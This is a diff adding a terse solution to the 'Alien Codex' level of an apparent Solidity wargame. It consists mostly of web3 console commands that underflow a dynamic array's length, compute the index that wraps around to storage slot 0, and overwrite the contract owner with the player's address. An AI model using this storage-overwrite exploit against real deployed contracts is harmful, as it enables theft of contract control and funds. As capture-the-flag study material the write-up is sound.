@@ -1,0 +1,31 @@
+Level 19: Alien Codex
+
+await contract.make_contact()
+await contract.retract()
+p = keccak256(slot)
+or, p = keccak256(1)
+
+
+Slot        Data
+------------------------------
+0             owner address, contact bool
+1             codex.length
+    .
+    .
+    .
+p             codex[0]
+p + 1         codex[1]
+    .
+    .
+2^256 - 2     codex[2^256 - 2 - p]
+2^256 - 1     codex[2^256 - 1 - p]
+0             codex[2^256 - p]  (overflow!)
+
+// Position
+p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
+
+i = BigInt(2 ** 256) - BigInt(p)
+
+content = '0x' + '0'.repeat(24) + player.slice(2)
+await contract.revise(i, content)
+await contract.owner() === player
